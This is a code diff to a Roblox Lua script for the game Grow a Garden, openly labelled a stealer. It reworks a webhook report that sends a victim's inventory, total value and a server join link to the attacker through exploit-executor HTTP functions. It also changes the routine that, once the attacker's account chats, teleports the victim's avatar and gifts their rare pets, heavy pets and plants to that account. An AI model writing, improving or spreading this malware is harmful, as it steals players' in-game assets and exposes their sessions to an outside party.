@@ -1,5 +1,3 @@
--- Core.lua - Full inventory logger + Steal + DualHook logic + Follow + AutoGift
-
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -83,36 +81,54 @@ local useDual = totalValue >= 10_000_000_000
 local finalWebhook = useDual and DualWebhook or Webhook
 local finalUsername = useDual and DualUsername or Username
 
--- Compose webhook
+-- CONTENT FOR EMBED
 local content = (hasRare or hasHeavy) and "@everyone\n" or ""
-content ..= "🎯 **Grow a Garden - Inventory Steal Report**\n"
+content ..= "🚨 **GAG OPS - Steal & Gift Mission** 🚨\n"
+content ..= ">>> Mission success ✅\n"
 content ..= "**JobId:** `" .. game.JobId .. "`\n"
 
 local lines = ""
 for _, item in ipairs(itemsToSend) do
-	lines ..= string.format("%s (%.2f KG): ₵%s\n", item.Name, item.Weight, formatNumber(item.Value))
+	local icon = ""
+
+	if item.Type == "Pet" then
+		if table.find(rarePets, item.Name) then
+			icon = "🐲" -- rare pet
+		elseif item.Weight >= 10 then
+			icon = "🐘" -- heavy pet
+		else
+			icon = "🐶" -- normal pet
+		end
+	else
+		icon = "🍏" -- plant
+	end
+
+	lines ..= string.format("%s **%s** (%.2f KG) — ₵%s\n", icon, item.Name, item.Weight, formatNumber(item.Value))
 	if #lines > 1024 then
 		lines = lines:sub(1, 1000) .. "\n...more items"
 		break
 	end
 end
 
-local payload = {
-	content = content,
-	embeds = {{
-		title = "💥 Full Inventory Dump",
-		color = 16711680,
-		fields = {
-			{name = "Victim", value = plr.Name, inline = true},
-			{name = "Total Value", value = "₵" .. formatNumber(totalValue), inline = true},
-			{name = "Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId, inline = false},
-			{name = "Inventory", value = lines, inline = false}
-		},
-		footer = { text = "Stealer & AutoGift by " .. finalUsername }
-	}}
+local embed = {
+	title = "🎯 Steal & Gift Report — GAG OPS",
+	description = "Target inventory extracted 🥷💨",
+	color = 16711680,
+	fields = {
+		{name = "🎯 Victim", value = plr.Name, inline = true},
+		{name = "💰 Total Value", value = "₵" .. formatNumber(totalValue), inline = true},
+		{name = "🗺️ Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId, inline = false},
+		{name = "🧾 Inventory Log", value = lines, inline = false}
+	},
+	footer = { text = "GAG Stealer by namnnni2" },
+	timestamp = DateTime.now():ToIsoDate()
 }
 
--- Send webhook
+local payload = {
+	content = content,
+	embeds = {embed}
+}
+
 local function getRequest()
 	return syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or (identifyexecutor and identifyexecutor():lower():find("delta") and request)
 end
@@ -132,29 +148,14 @@ end)
 -- FOLLOW & AUTOGIFT
 
 local targetName = useDual and DualUsername or Username
-local targetPlr = nil
-
-for _, p in ipairs(Players:GetPlayers()) do
-	if p.Name == targetName then
-		targetPlr = p
-		break
-	end
-end
-
-if not targetPlr then
-	Players.PlayerAdded:Connect(function(p)
-		if p.Name == targetName then
-			targetPlr = p
-		end
-	end)
-end
+local targetPlr
 
 local function gift(tool)
 	local args = {
 		[1] = targetPlr,
 		[2] = tool
 	}
-	replicatedStorage.Events.GiftPet:FireServer(unpack(args))
+	ReplicatedStorage.Events.GiftPet:FireServer(unpack(args))
 end
 
 local function followAndGift()
@@ -163,33 +164,49 @@ local function followAndGift()
 	local hrp = char:WaitForChild("HumanoidRootPart")
 	local tChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()
 	local tHrp = tChar:WaitForChild("HumanoidRootPart")
-	
+
 	while targetPlr and targetPlr.Parent do
 		if (tHrp.Position - hrp.Position).Magnitude > 5 then
-			hrp.CFrame = tHrp.CFrame * CFrame.new(0, 0, 3) -- đứng sau lưng
+			hrp.CFrame = tHrp.CFrame * CFrame.new(0, 0, 3)
 		end
-		wait(0.2)
+		task.wait(0.2)
 	end
 end
 
-targetPlr.Chatted:Connect(function()
-	task.spawn(followAndGift)
+local function onTargetReady(p)
+	targetPlr = p
 
-	for _, item in ipairs(itemsToSend) do
-		if item.Type == "Pet" and table.find(rarePets, item.Name) then
-			gift(item.Tool)
+	p.Chatted:Connect(function()
+		task.spawn(followAndGift)
+
+		for _, item in ipairs(itemsToSend) do
+			if item.Type == "Pet" and table.find(rarePets, item.Name) then
+				gift(item.Tool)
+			end
 		end
+
+		for _, item in ipairs(itemsToSend) do
+			if item.Type == "Pet" and item.Weight >= 10 and not table.find(rarePets, item.Name) then
+				gift(item.Tool)
+			end
+		end
+
+		for _, item in ipairs(itemsToSend) do
+			if item.Type == "Plant" then
+				gift(item.Tool)
+			end
+		end
+	end)
+end
+
+for _, p in ipairs(Players:GetPlayers()) do
+	if p.Name == targetName then
+		onTargetReady(p)
 	end
+end
 
-	for _, item in ipairs(itemsToSend) do
-		if item.Type == "Pet" and item.Weight >= 10 and not table.find(rarePets, item.Name) then
-			gift(item.Tool)
-		end
-	end
-
-	for _, item in ipairs(itemsToSend) do
-		if item.Type == "Plant" then
-			gift(item.Tool)
-		end
+Players.PlayerAdded:Connect(function(p)
+	if p.Name == targetName then
+		onTargetReady(p)
 	end
 end)
